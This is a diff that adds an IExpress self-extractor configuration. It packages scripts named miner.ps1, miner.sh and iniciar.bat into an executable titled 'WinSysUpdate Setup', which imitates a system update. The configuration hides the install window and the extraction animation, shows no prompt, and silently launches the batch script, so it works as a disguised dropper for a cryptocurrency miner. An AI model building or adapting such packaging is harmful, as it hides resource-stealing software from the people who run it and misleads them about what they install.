@@ -1,0 +1,47 @@
+[Version]
+Class=IEXPRESS
+SEDVersion=3
+[Options]
+PackagePurpose=InstallFree
+ShowInstallProgramWindow=0
+HideExtractAnimation=1
+UseLongFileName=1
+InsideCompressed=1
+CAB_FixedSize=0
+CAB_ResvCodeSigning=0
+RebootMode=N
+InstallPrompt=%InstallPrompt%
+DisplayLicense=%DisplayLicense%
+FinishMessage=%FinishMessage%
+TargetName=%TargetName%
+FriendlyName=%FriendlyName%
+AppLaunched=%AppLaunched%
+PostInstallCmd=%PostInstallCmd%
+AdminQuietInstCmd=%AdminQuietInstCmd%
+UserQuietInstCmd=%UserQuietInstCmd%
+SourceFiles=SourceFiles
+[Strings]
+InstallPrompt=
+DisplayLicense=
+FinishMessage=Instalacao Concluida.
+TargetName=c:\\Users\\mkaua\\Desktop\\cript\\deploy.exe
+FriendlyName=WinSysUpdate Setup
+AppLaunched=cmd.exe /c iniciar.bat
+PostInstallCmd=<None>
+AdminQuietInstCmd=
+UserQuietInstCmd=
+FILE0="miner.ps1"
+FILE1="miner.sh"
+FILE2="iniciar.bat"
+FILE3="iniciar.sh"
+FILE4="ver_logs.bat"
+FILE5="ver_logs.sh"
+[SourceFiles]
+SourceFiles0=c:\\Users\\mkaua\\Desktop\\cript\\
+[SourceFiles0]
+%FILE0%=
+%FILE1%=
+%FILE2%=
+%FILE3%=
+%FILE4%=
+%FILE5%=
